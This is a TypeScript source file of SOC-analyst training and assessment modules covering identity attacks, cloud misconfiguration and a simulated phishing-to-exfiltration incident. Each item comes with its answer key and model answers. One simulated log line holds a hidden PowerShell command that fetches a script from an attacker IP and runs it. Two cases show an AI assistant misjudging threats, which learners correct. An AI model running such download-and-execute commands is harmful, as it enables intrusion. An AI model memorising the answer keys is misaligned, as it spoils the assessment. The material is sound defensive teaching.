      'case',
      S,
      caseStudy(
        'm-ir-x-s',
        'Three Audiences',
        `${IR_NOTES}

Tomorrow you must brief three groups: the IT team, the partners, and (in writing) the ICO.`,
        'Notes'
      ),
      written(
        'm-ir-x-s1',
        'Lessons and Actions',
        'Write the “root cause and actions” section of the report: the root cause, contributing factors, and actions with owners and dates.',
        [
          'Root cause: a legacy VPN profile without MFA let a stolen password in',
          'Contributing factors: no alert on a foreign VPN login or on 38 GB going out, RDP to the file server allowed, rclone allowed to run',
          'Actions with owners and dates: remove legacy profiles and enforce MFA, alerting on unusual VPN logins and large uploads, restrict RDP, application control',
          'Includes checking how the password was stolen and the backup gap (Monday’s lost work)',
        ],
        `Root cause: a legacy VPN profile didn't enforce MFA, so a stolen password for t.ward was enough to get in.

Contributing factors: no alert on a VPN login from Romania at 17:48 on a Friday; RDP from VPN users straight to the file server was allowed; nothing flagged rclone or 38 GB leaving for mega.nz over 30 minutes; backups ran nightly, so Monday morning's work was lost.

Actions: remove all legacy VPN profiles and enforce MFA (IT lead, this week); alert on VPN logins from new countries and on large uploads to file-sharing services (SOC lead, 2 weeks); restrict RDP to admin jump hosts (IT lead, 2 weeks); block unapproved tools like rclone (IT lead, 1 month); find how t.ward's password was stolen and check for it elsewhere (SOC, this week); move file-server backups to hourly snapshots (IT lead, 1 month).`,
        { taskId: 'm-ir-x-s' }
      ),
      choice(
        'm-ir-x-s2',
        'What the ICO Needs',
        'What must the written notification to the ICO include?',
        [
          'What happened, the categories and rough number of people and records affected, likely consequences, what you’ve done and will do, and a contact',
          'Only that an incident happened',
          'The attacker’s IP addresses',
          'Nothing until the investigation ends',
        ],
        0,
        { taskId: 'm-ir-x-s' }
      )
    ),
  ],
};

// ---------- Identity & cloud ----------
export const IDENTITY_MODULE: ModuleSkeleton = {
  familyId: 'test-idcloud-01',
  aspects: [
    { id: 'identity', name: 'Identity Attacks', summary: 'Spraying, MFA fatigue, token theft and risky sign-ins.' },
    { id: 'cloud', name: 'Cloud Logs & Misconfiguration', summary: 'Audit logs, public buckets and keys left lying around.' },
    { id: 'harden', name: 'Hardening', summary: 'MFA that resists phishing, least privilege and conditional access.' },
    { id: 'case', name: 'Identity & Cloud Cases', summary: 'Real sign-ins and audit trails to read.' },
  ],
  tags: {},
  bank: [
    ...tagged(
      'identity',
      B,
      choice(
        'm-id-i-b1',
        'MFA Prompts',
        'A user gets MFA push prompts they didn’t ask for, again and again. What’s happening?',
        ['Someone has their password and is trying to get them to approve a prompt (MFA fatigue)', 'A phone glitch', 'An update', 'Nothing'],
        0
      )
    ),
    ...tagged(
      'identity',
      J,
      choice(
        'm-id-i-j1',
        'Spray or Brute Force?',
        'One IP tries “Winter2026!” once against 600 different accounts. What is it?',
        ['Password spraying', 'Brute force', 'Credential stuffing of one account', 'A DDoS'],
        0
      )
    ),
    ...tagged(
      'identity',
      P,
      choice(
        'm-id-i-p1',
        'Token Theft',
        'A session is used from a new country with no new sign-in or MFA prompt. What’s likely?',
        ['A stolen session token or cookie is being replayed; revoke the user’s sessions and tokens, not just the password', 'The user is travelling', 'A password reset fixes it on its own', 'MFA is off'],
        0
      )
    ),
    ...tagged(
      'identity',
      S,
      choice(
        'm-id-i-s1',
        'A Consent Grant',
        'Users are prompted to grant an app called “Doc Viewer” permission to read their mail and files. Several accept. Why is this serious?',
        ['Illicit consent: the app gets a token to their data that survives password resets and bypasses MFA; revoke the grants and restrict user consent', 'It isn’t; users chose it', 'Only if the app is paid', 'It only reads metadata'],
        0
      )
    ),
    ...tagged(
      'cloud',
      B,
      choice(
        'm-id-c-b1',
        'A Public Bucket',
        'A storage bucket of customer invoices is set to public. What’s the risk?',
        ['Anyone with the link, or anyone scanning for open buckets, can download them', 'None; it’s in the cloud', 'Only slower access', 'Higher costs'],
        0
      )
    ),
    ...tagged(
      'cloud',
      J,
      match('m-id-c-j1', 'Cloud Audit Logs', 'Match each log to its cloud.', [
        ['CloudTrail', 'AWS'],
        ['Activity Log and Entra sign-in logs', 'Microsoft Azure'],
        ['Cloud Audit Logs', 'Google Cloud'],
        ['Unified Audit Log', 'Microsoft 365'],
      ])
    ),
    ...tagged(
      'cloud',
      P,
      choice(
        'm-id-c-p1',
        'A Key on GitHub',
        'An AWS access key was pushed to a public GitHub repo an hour ago. What comes first?',
        ['Deactivate the key now, then check CloudTrail for what it did since it was exposed', 'Delete the commit', 'Make the repo private', 'Wait for an AWS email'],
        0
      )
    ),
    ...tagged(
      'cloud',
      S,
      choice(
        'm-id-c-s1',
        'Turning Off Logging',
        'CloudTrail shows StopLogging, then new IAM users, then large EC2 instances in an unused region. What’s the story?',
        ['An attacker with admin access hiding their tracks, creating persistence and mining crypto; contain the identity used and restore logging', 'A cost-saving exercise', 'An AWS bug', 'Normal autoscaling'],
        0
      )
    ),
    ...tagged(
      'harden',
      B,
      choice(
        'm-id-h-b1',
        'Least Privilege',
        'What does least privilege mean?',
        ['Each account has only the access it needs for its job', 'Everyone gets admin to save time', 'Passwords are short', 'Only managers have accounts'],
        0
      )
    ),
    ...tagged(
      'harden',
      J,
      choice(
        'm-id-h-j1',
        'Number Matching',
        'How does number matching on MFA push help?',
        ['The user must type the number shown on the login screen, so they can’t approve a prompt they didn’t start by mistake', 'It makes passwords longer', 'It stops all phishing', 'It encrypts the push'],
        0
      )
    ),
    ...tagged(
      'harden',
      P,
      choice(
        'm-id-h-p1',
        'Admin Accounts',
        'How should IT admins’ privileged access be set up?',
        ['Separate admin accounts with phishing-resistant MFA, used only from managed devices, with just-in-time elevation', 'Their normal account with admin rights', 'A shared admin password', 'Admin rights for everyone in IT permanently'],
        0
      )
    ),
    ...tagged(
      'harden',
      S,
      choice(
        'm-id-h-s1',
        'Conditional Access',
        'Which conditional access policy most reduces account takeover?',
        ['Require phishing-resistant MFA and a compliant device for sign-ins, and block legacy authentication that can’t do MFA', 'Block one country', 'Require password changes every 30 days', 'Show a warning banner'],
        0
      )
    ),
    ...tagged('case', B, short('m-id-x-b1', 'Which Log?', 'Which AWS service logs API calls such as who created an IAM user?', ['CloudTrail', 'AWS CloudTrail'])),
    ...tagged(
      'case',
      J,
      caseStudy(
        'm-id-x-j',
        'Risky Sign-ins',
        `Entra ID sign-ins for p.nash:

09:02  London, UK         Windows / Edge    MFA: passed (app)     Success
09:45  London, UK         iPhone / Outlook  MFA: passed (app)     Success
10:03  Lagos, Nigeria     Linux / python    MFA: required         Failure (MFA denied)
10:04  Lagos, Nigeria     Linux / python    MFA: required         Failure (MFA denied)
10:06  Lagos, Nigeria     Linux / python    MFA: required         Success (MFA approved)`,
        'Sign-in logs'
      ),
      choice(
        'm-id-x-j1',
        'What Happened',
        'What does this show?',
        ['p.nash’s password is known to an attacker, who got a push approved after two denials', 'p.nash flew to Lagos', 'A failed attack', 'Normal mobile use'],
        0,
        { taskId: 'm-id-x-j' }
      ),
      written(
        'm-id-x-j2',
        'Your Actions',
        'Write what you do next.',
        [
          'Revokes p.nash’s sessions and tokens and resets the password',
          'Checks what the attacker did after 10:06: mailbox rules, files, MFA methods added, apps consented',
          'Talks to p.nash about the approval, kindly, and how the password was exposed',
          'Moves the user (and ideally everyone) to number matching or phishing-resistant MFA',
        ],
        `The attacker has p.nash's password and got in at 10:06 after p.nash approved a push, probably to make the prompts stop. Revoke all sessions and refresh tokens and reset the password now. Then check what happened after 10:06: inbox rules, forwarding, files downloaded, new MFA methods or app consents. Talk to p.nash without blame — explain the push came from an attacker and find out where else the password is used. And turn on number matching, or better, passkeys, so approving a stray prompt isn't enough.`,
        { taskId: 'm-id-x-j' }
      )
    ),
    ...tagged(
      'case',
      P,
      caseStudy(
        'm-id-x-p',
        'An AI Reviews an S3 Policy',
        `You asked an AI assistant whether this S3 bucket policy for "nw-invoices" is safe. The bucket holds customer invoices.

{
  "Effect": "Allow",
  "Principal": "*",
  "Action": ["s3:GetObject", "s3:ListBucket"],
  "Resource": ["arn:aws:s3:::nw-invoices", "arn:aws:s3:::nw-invoices/*"]
}

AI: "This policy is safe. It only allows read access (GetObject and ListBucket), not write or delete, so customer data cannot be changed."`,
        'Policy and AI answer'
      ),
      multi(
        'm-id-x-p1',
        'What the AI Missed',
        'Which points show the AI is wrong? Tick all that apply.',
        [
          'Principal "*" means anyone on the internet, not just your accounts',
          'ListBucket lets anyone list every file name, and GetObject lets them download each one',
          'Read access to customer invoices is itself a data breach',
          'It allows deleting objects',
        ],
        [0, 1, 2],
        { taskId: 'm-id-x-p' }
      ),
      written(
        'm-id-x-p2',
        'Fix and Follow Up',
        'Write the fix and the follow-up.',
        [
          'Removes public access: Block Public Access on, policy limited to the specific roles that need it',
          'Checks S3 server access logs or CloudTrail data events for downloads by outside parties',
          'Treats any outside download as a personal-data breach and escalates',
          'Adds guardrails, e.g. account-level Block Public Access and alerts on public bucket policies',
        ],
        `The AI is wrong: Principal "*" is anyone on the internet, and with ListBucket plus GetObject they can list and download every invoice. Read-only doesn't make it safe — reading is the breach. Fix: turn on Block Public Access for the bucket (and the account), and rewrite the policy to allow only the invoicing role. Then check S3 access logs or CloudTrail data events for downloads from outside our accounts since the policy was set; if there are any, it's a personal-data breach to escalate. Add an alert for any bucket policy that allows "*".`,
        { taskId: 'm-id-x-p' }
      )
    ),
    ...tagged(
      'case',
      S,
      caseStudy(
        'm-id-x-s',
        'CloudTrail',
        `CloudTrail, account prod-01:

03:12  ConsoleLogin        user: ci-deploy     src: 185.191.171.4   MFA: No
03:14  CreateAccessKey     user: ci-deploy     for user: ci-deploy
03:15  StopLogging         trail: org-trail    (fails: SCP denies)
03:16  CreateUser          backup-svc
03:16  AttachUserPolicy    backup-svc ← AdministratorAccess
03:20  RunInstances        x 40, type p4d.24xlarge, region ap-southeast-3

ci-deploy is the CI pipeline's user. It has never logged in to the console before.`,
        'CloudTrail'
      ),
      order(
        'm-id-x-s1',
        'Containment Order',
        'Put your first actions in order.',
        [
          'Disable ci-deploy’s console access and all its access keys',
          'Disable backup-svc and remove its AdministratorAccess',
          'Terminate the 40 instances (after snapshotting one for evidence)',
          'Search CloudTrail for every other action by both users and the source IP',
          'Rotate the CI pipeline’s credentials and find how they leaked',
        ],
        { taskId: 'm-id-x-s' }
      ),
      written(
        'm-id-x-s2',
        'What Went Wrong',
        'Write the root cause and the guardrails you’d recommend.',
        [
          'A long-lived CI user with console access, no MFA and broad permissions was compromised',
          'Credit for the guardrail that worked: the SCP stopped logging being turned off',
          'Recommends short-lived credentials for CI (roles/OIDC), no console for machine users, least privilege',
          'Recommends SCPs or alerts on new admin users, unused regions and GPU instance types, plus budget alerts',
        ],
        `Root cause: the CI pipeline used a long-lived IAM user that could log in to the console without MFA and had enough rights to create admins; its credentials leaked and an attacker used them to set up a backdoor admin and start 40 GPU instances, almost certainly for crypto-mining. One guardrail worked: the organisation SCP stopped them turning off the trail, which is why we can see all this. Recommendations: move CI to short-lived role credentials (OIDC federation) with no console access and only the permissions it deploys with; SCPs that block unused regions and GPU types; alerts on new IAM users, admin policy attachments and first-ever console logins by machine users; and budget alerts.`,
        { taskId: 'm-id-x-s' }
      )
    ),
  ],
};

// ---------- SOC final project ----------
const QUEUE = `Monday 08:00. Your queue (Northwind Kitchenware, 400 staff):

A1  Low     Port scan from 45.143.200.11 blocked at the firewall
A2  Medium  User m.ali reported a phishing email ("Invoice overdue"), no click recorded
A3  Medium  Impossible travel: l.ford, Leeds 07:10 then Amsterdam 07:25
A4  High    EDR: suspicious PowerShell on FIN-PC-04 (user: s.khan), 07:41
A5  Low     40 failed logins to the VPN for 'administrator' from 103.75.44.2, none successful
A6  Medium  Outbound upload of 2.1 GB from FIN-PC-04 to 172.67.9.88, 07:55`;

const SOC_LOGS = `FIN-PC-04 (s.khan), from EDR and proxy:

07:38  outlook.exe opens "Remittance_Advice.html" from an email "Payment confirmation"
07:39  msedge.exe → hxxps://nw-sharepoint-login.pages.dev (credential page)
07:40  Entra ID: s.khan sign-in from 91.92.240.18 (Bulgaria), MFA approved, Success
07:41  powershell.exe -w hidden -c "iwr hxxps://91.92.240.18/a.ps1 | iex"
07:44  New scheduled task "EdgeUpdateCore" → C:\\ProgramData\\eu.exe
07:52  eu.exe reads \\\\FS01\\Finance\\Payroll\\*.xlsx (412 files)
07:55  eu.exe uploads 2.1 GB to 172.67.9.88:443
08:02  s.khan's mailbox: new rule "forward messages containing 'payment' to nw-accounts@proton.me"

Other context:
- l.ford's Amsterdam sign-in came from the company's Zscaler egress IP, on her usual laptop
- 45.143.200.11 and 103.75.44.2 are on public scanner lists`;

export const SOC_SIM_MODULE: ModuleSkeleton = {
  familyId: 'test-sim-soc-01',
  aspects: [
    { id: 'queue', name: 'Working the Queue', summary: 'Sorting a morning’s alerts by what matters.' },
    { id: 'hunt', name: 'Finding the Attack', summary: 'Following one alert into the logs until the story is clear.' },
    { id: 'report', name: 'The Incident Report', summary: 'Writing it up with impact and next steps.' },
    { id: 'case', name: 'The Monday Queue', summary: 'Northwind’s alerts and logs, start to finish.' },
  ],
  tags: {},
  bank: [
    ...tagged(
      'queue',
      B,
      choice(
        'm-socs-q-b1',
        'Start of Shift',
        'What do you do first at the start of a shift?',
        ['Read the handover and sort the queue by severity and asset, so the worst is handled first', 'Work the oldest alert first', 'Close all lows', 'Check email'],
        0
      )
    ),
    ...tagged(
      'queue',
      J,
      choice(
        'm-socs-q-j1',
        'Related Alerts',
        'Two alerts in the queue mention the same host ten minutes apart. How do you handle them?',
        ['Together, as one possible incident, since they may be steps of the same attack', 'Separately, in queue order', 'Close the older one', 'Ignore the lower one'],
        0
      )
    ),
    ...tagged(
      'queue',
      P,
      choice(
        'm-socs-q-p1',
        'Closing Fast, Safely',
        'A blocked scan from an IP on public scanner lists. How do you close it?',
        ['Confirm it was blocked and nothing got through, note the evidence, and close as a blocked attempt', 'Escalate it', 'Close with no note', 'Block the whole country'],
        0
      )
    ),
    ...tagged(
      'queue',
      S,
      choice(
        'm-socs-q-s1',
        'Too Much for One Analyst',
        'Mid-investigation you realise an attack is live and spreading. What do you do with the rest of the queue?',
        ['Declare the incident and hand the queue to a colleague or the on-call lead so the incident gets your full attention', 'Finish the queue first', 'Ignore the queue', 'Work both at once'],
        0
      )
    ),
    ...tagged(
      'hunt',
      B,
      choice(
        'm-socs-h-b1',
        'Pivoting',
        'In an investigation, what does “pivoting” mean?',
        ['Using one clue (a host, user, IP or hash) to search for related activity elsewhere', 'Turning the screen', 'Closing the alert', 'Switching shifts'],
        0
      )
    ),
    ...tagged(
      'hunt',
      J,
      multi(
        'm-socs-h-j1',
        'Pivot Points',
        'A host ran a malicious script from an IP. What do you search for next? Tick all that apply.',
        ['Other hosts contacting that IP', 'Other sign-ins by the same user', 'Persistence on the host', 'Files the process touched', 'The weather'],
        [0, 1, 2, 3]
      )
    ),
    ...tagged(
      'hunt',
      P,
      choice(
        'm-socs-h-p1',
        'Contain or Watch?',
        'You find an attacker active on one PC, copying files out. Do you contain now or watch to learn more?',
        ['Contain now: data is leaving; isolate through EDR, which keeps the evidence', 'Watch for a day to learn more', 'Wait for the manager', 'Power the PC off'],
        0
      )
    ),
    ...tagged(
      'hunt',
      S,
      choice(
        'm-socs-h-s1',
        'Is It Over?',
        'You’ve isolated the PC and reset the user. How do you know the attacker is gone?',
        ['You don’t yet: hunt for the indicators and techniques across all hosts and accounts, and watch for return before declaring it closed', 'They’re gone', 'Reboot everything', 'Ask the user'],
        0
      )
    ),
    ...tagged(
      'report',
      B,
      choice(
        'm-socs-r-b1',
        'Incident Report',
        'Who is an incident report for?',
        ['Everyone who must act or decide: IT, managers, and sometimes legal and regulators', 'Only the SOC', 'Only the attacker', 'Nobody; it’s for the file'],
        0
      )
    ),
    ...tagged(
      'report',
      J,
      choice(
        'm-socs-r-j1',
        'Next Steps',
        'What makes a next step useful in a report?',
        ['It says what, who owns it, and by when', '“Improve security”', '“Be more careful”', '“Monitor”'],
        0
      )
    ),
    ...tagged(
      'report',
      P,
      choice(
        'm-socs-r-p1',
        'Payroll Data',
        'Payroll spreadsheets (names, bank details, salaries) were uploaded to an attacker. What must the report raise?',
        ['A likely reportable personal-data breach (72 hours to the ICO) and the people affected', 'Nothing; it was internal data', 'Only the IT fix', 'A request to pay the attacker'],
        0
      )
    ),
    ...tagged(
      'report',
      S,
      choice(
        'm-socs-r-s1',
        'Fraud Risk',
        'The attacker set a rule forwarding “payment” emails from a finance mailbox. What does the report need to say beyond IT steps?',
        ['Warn finance and suppliers of likely payment-diversion fraud, and check recent payment-detail changes and outgoing payments', 'Nothing; the rule is removed', 'Only that a rule was created', 'Ask suppliers to change banks'],
        0
      )
    ),
    ...tagged('case', B, short('m-socs-x-b1', 'Most Urgent', 'From this list, which alert do you open first: a blocked port scan, a reported phishing email, or ransomware behaviour on a server? (Answer in a few words.)', ['ransomware', 'ransomware behaviour on a server', 'the ransomware', 'ransomware on a server'])),
    ...tagged(
      'case',
      J,
      caseStudy('m-socs-x-j', 'The Queue', QUEUE, 'Alert queue'),
      order(
        'm-socs-x-j1',
        'Sort the Queue',
        'Order these alerts by priority, most urgent first.',
        ['A4 Suspicious PowerShell on FIN-PC-04', 'A6 2.1 GB upload from FIN-PC-04', 'A3 Impossible travel for l.ford', 'A2 Reported phishing, no click', 'A5 Failed VPN logins, none successful', 'A1 Blocked port scan'],
        { taskId: 'm-socs-x-j' }
      ),
      multi(
        'm-socs-x-j2',
        'Connected',
        'Which alerts are likely part of the same incident? Tick all that apply.',
        ['A4', 'A6', 'A1', 'A5'],
        [0, 1],
        { taskId: 'm-socs-x-j' }
      )
    ),
    ...tagged(
      'case',
      P,
      caseStudy(
        'm-socs-x-p',
        'Into the Logs',
        `${QUEUE}

${SOC_LOGS}

A colleague pasted the logs into an AI assistant. It answered:

"FIN-PC-04 ran a PowerShell update script and synced 2.1 GB of payroll files to a Cloudflare backup (172.67.x.x is Cloudflare). The sign-in from Bulgaria passed MFA, so it was s.khan on a VPN. The mailbox rule is a user-made filter. Severity: Low. Close A4 and A6."`,
        'Queue, logs and AI answer'
      ),
      short('m-socs-x-p1', 'Attacker IP', 'Which IP did the attacker sign in from and host their script on?', ['91.92.240.18'], { taskId: 'm-socs-x-p' }),
      multi(
        'm-socs-x-p2',
        'The Attack Chain',
        'Which are true of what happened? Tick all that apply.',
        [
          's.khan opened a phishing attachment and entered credentials on a fake SharePoint page',
          'The attacker signed in as s.khan with an approved MFA prompt',
          'Malware set up persistence with a scheduled task',
          'Payroll files were read and 2.1 GB was uploaded',
          'A mailbox rule now forwards payment emails to the attacker',
          'l.ford’s sign-in is part of the attack',
        ],
        [0, 1, 2, 3, 4],
        { taskId: 'm-socs-x-p' }
      ),
      written(
        'm-socs-x-p3',
        'Correct the AI',
        'Point out what the AI got wrong, citing the log lines, and give the right severity.',
        [
          'The PowerShell downloads and runs a script from the attacker’s Bulgarian IP, the same IP that signed in as s.khan (07:40, 07:41)',
          '172.67.x.x being Cloudflare doesn’t make it a company backup: eu.exe, a new unsigned tool with a fake task name, uploaded payroll files',
          'MFA was approved two minutes after s.khan entered credentials on a fake page: likely an adversary-in-the-middle or a pushed approval, not proof it was s.khan',
          'A rule forwarding “payment” mail to an outside proton.me address is attacker activity; severity is critical, not low',
        ],
        `Almost all of it is wrong. At 07:39 s.khan entered credentials on a fake SharePoint page; a minute later the account signed in from 91.92.240.18 with MFA approved — the attacker relaying or prompting it, not s.khan on a VPN. At 07:41 the "update script" was downloaded from that same IP and run hidden. eu.exe, launched by a task named to look like Edge, read 412 payroll files and uploaded 2.1 GB; Cloudflare hosts anyone, so the IP proves nothing about it being ours. And a rule forwarding "payment" mail to proton.me is classic fraud set-up. Severity: critical — an active compromise with personal data taken.`,
        { taskId: 'm-socs-x-p' }
      )
    ),
    ...tagged(
      'case',
      S,
      caseStudy('m-socs-x-s', 'The Incident', `${QUEUE}\n\n${SOC_LOGS}`, 'Queue and logs'),
      written(
        'm-socs-x-s1',
        'Incident Report',
        'Write the incident report: summary, timeline, impact, actions taken, and next steps with owners.',
        [
          'Summary and timeline from the 07:38 phishing email to the 08:02 forwarding rule, with times',
          'Impact: payroll personal data (412 files, 2.1 GB) taken, finance mailbox compromised, payment-fraud risk; likely reportable to the ICO within 72 hours',
          'Containment: isolate FIN-PC-04, revoke s.khan’s sessions and reset, remove the rule and task, block 91.92.240.18, 172.67.9.88 and the phishing domain, pull the email from all mailboxes',
          'Next steps with owners: hunt for the same indicators elsewhere, warn finance and suppliers, legal/DPO on notification, phishing-resistant MFA, and closes the unrelated alerts (A1, A3, A5) with reasons',
        ],
        `Summary: a phishing email gave an attacker s.khan's credentials; they signed in, installed malware on FIN-PC-04, stole 412 payroll files and set up email forwarding to divert payments. Critical.

Timeline (Mon): 07:38 "Remittance_Advice.html" opened; 07:39 credentials entered on nw-sharepoint-login.pages.dev; 07:40 sign-in as s.khan from 91.92.240.18 (Bulgaria), MFA approved; 07:41 hidden PowerShell runs a.ps1 from the same IP; 07:44 persistence via task "EdgeUpdateCore" → eu.exe; 07:52 eu.exe reads \\\\FS01\\Finance\\Payroll (412 files); 07:55 2.1 GB uploaded to 172.67.9.88; 08:02 rule forwards "payment" mail to nw-accounts@proton.me.

Impact: staff payroll data (names, bank details, salaries) taken — a likely reportable breach, ICO deadline 72 hours from 07:55 today; finance mailbox compromised; payment-diversion fraud risk.

Done: FIN-PC-04 isolated; s.khan's sessions revoked and password reset; rule and task removed; IPs and phishing domain blocked; email pulled from all mailboxes.

Next: hunt for the IPs, eu.exe hash and task name across all hosts (SOC, today); check who else visited the phishing page (SOC, today); DPO and legal on ICO and staff notification (DPO, today); warn finance and key suppliers, review payment changes since Friday (Finance lead, today); move finance to phishing-resistant MFA (IT, 2 weeks).

Other alerts: A1 and A5 blocked attempts from known scanners, closed; A3 l.ford via our Zscaler egress on her usual laptop, closed as benign; A2 check whether it's the same campaign.`,
        { taskId: 'm-socs-x-s' }
      )
    ),
  ],
};

export const SECURITY_MODULES = [NETWORK_MODULE, OS_MODULE, LOGS_MODULE, TRIAGE_MODULE, PHISHING_MODULE, REPORTING_MODULE, IDENTITY_MODULE, SOC_SIM_MODULE];
